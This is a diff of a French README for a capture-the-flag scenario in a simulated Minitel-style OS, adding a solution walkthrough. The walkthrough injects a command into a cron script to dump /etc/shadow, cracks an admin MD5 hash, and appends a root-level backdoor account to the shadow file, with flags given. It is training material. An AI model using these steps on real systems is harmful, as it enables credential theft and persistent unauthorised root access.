@@ -27,7 +27,8 @@ stagiaire/1234 ──► cron injection ──► admin/minitel ──► motd b
 git clone <repo> && cd MinitelOS
 git checkout ctf/scenario-3-backdoor-cron
 pio run -e native
-.pio/build/native/program
+.pio/build/native/program           # vitesse normale
+.pio/build/native/program --baud=1200  # simulation vitesse Minitel 1B
 ```
 
 ### ESP32 physique
@@ -38,7 +39,8 @@ pio run -e MinitelOS -t uploadfs   # filesystem (première fois)
 pio device monitor
 ```
 
-> `CTF_MODE` recrée l'environnement complet à chaque boot — reset entre équipes : `rm -rf sim_fs/` ou reboot ESP32.
+> `CTF_MODE` recrée l'environnement complet à chaque boot.
+> **Reset entre équipes** : taper `ctftime` (reset auto si temps écoulé), ou redémarrer l'ESP32.
 
 ---
 
@@ -89,8 +91,6 @@ cat /tmp/loot.txt
 ### Crack du hash
 
 ```
-Wordlist : minitel  password  admin  1234  telmini  root  azerty  qwerty
-
 admin:bb3c3e98175d33c8300fbb0e84bf9e9f → "minitel"
 ```
 
@@ -209,16 +209,19 @@ sim_fs/
 
 ```bash
 # Phase 2 — Credential Access
-edit /scripts/maintenance.msh   → a: cat /etc/shadow > /tmp/loot.txt  → w q!
-# (attendre 30s)
-cat /tmp/loot.txt               → hash admin = "minitel"
-su admin / minitel
+edit /scripts/maintenance.msh
+# → :a  →  cat /etc/shadow > /tmp/loot.txt  →  Entrée  →  :wq
+# (attendre ~30s)
+cat /tmp/loot.txt               # hash admin = bb3c3e... → "minitel"
+su admin                        # password : minitel
 
 # Phase 3 — Flag utilisateur
-cat user.txt                    → FLAG{4dm1n_4cc3ss}
+cat user.txt                    # FLAG{4dm1n_4cc3ss}
 
 # Phase 4 — Root
-edit motd_perso.txt             → a: echo pwned:81dc9bdb52d04dc20036dbd8313ed055:root >> /etc/shadow  → w q!
-motd && su pwned / 1234
-cat /root/root.txt              → FLAG{r00t_m0td_pwn3d}
+edit motd_perso.txt
+# → :a  →  echo pwned:81dc9bdb52d04dc20036dbd8313ed055:root >> /etc/shadow  →  Entrée  →  :wq
+motd
+su pwned                        # password : 1234
+cat /root/root.txt              # FLAG{r00t_m0td_pwn3d}
 ```
